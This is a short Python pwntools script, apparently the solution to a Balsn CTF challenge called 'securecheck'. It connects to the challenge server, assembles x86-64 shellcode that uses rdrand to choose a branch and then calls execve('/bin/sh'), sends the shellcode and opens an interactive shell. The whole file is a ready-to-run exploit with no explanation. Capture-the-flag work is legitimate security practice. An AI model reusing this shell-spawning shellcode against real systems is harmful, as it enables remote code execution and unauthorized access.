#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
r = remote('securecheck.balsnctf.com', 54321)

sc = asm('''
    rdrand eax
    and eax, 0x1
    cmp ax, 0x1
    je SYSCALL
    mov eax, 0x3c
    xor edi, edi
    syscall

SYSCALL:
    lea rsp, [rdx+0xf00]
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    mov eax, 0x3b
    xor esi, esi
    xor edx, edx
    syscall
''')

r.send(sc)

r.interactive()
